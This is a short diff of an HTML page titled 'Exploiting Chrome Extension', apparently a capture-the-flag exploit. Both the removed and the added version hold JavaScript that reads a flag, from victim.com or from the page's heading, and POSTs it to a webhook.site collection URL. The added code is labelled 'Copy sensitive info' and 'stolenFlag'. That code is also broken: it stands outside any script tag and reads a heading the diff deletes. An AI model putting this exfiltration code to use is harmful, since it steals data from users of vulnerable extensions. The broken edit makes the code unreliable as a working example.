@@ -20,18 +20,19 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Exploiting Chrome Extension</title>
-    <script>
-        document.title = `<script>
-        fetch('https://victim.com/flag.html')
-          .then(res => res.text())
-          .then(data => fetch('https://webhook.site/fd72ea59-3fa6-4bc7-8a83-176bf7ad585b',{
-              method:'POST',body:data
-          }));
-        </script>`;
-    </script>
+setTimeout(() => {
+  document.title = document.querySelector("h1").innerText; // Copy sensitive info
+}, 2000);
+
+setTimeout(() => {
+  let stolenFlag = document.title;
+  fetch('https://webhook.site/fd72ea59-3fa6-4bc7-8a83-176bf7ad585b', {
+    method: 'POST',
+    body: JSON.stringify({flag: stolenFlag}),
+    headers: {'Content-Type': 'application/json'}
+  });
+}, 5000);
 </head>
 <body>
-    <h1>Waiting for extension to trigger...</h1>
 </body>
 </html>
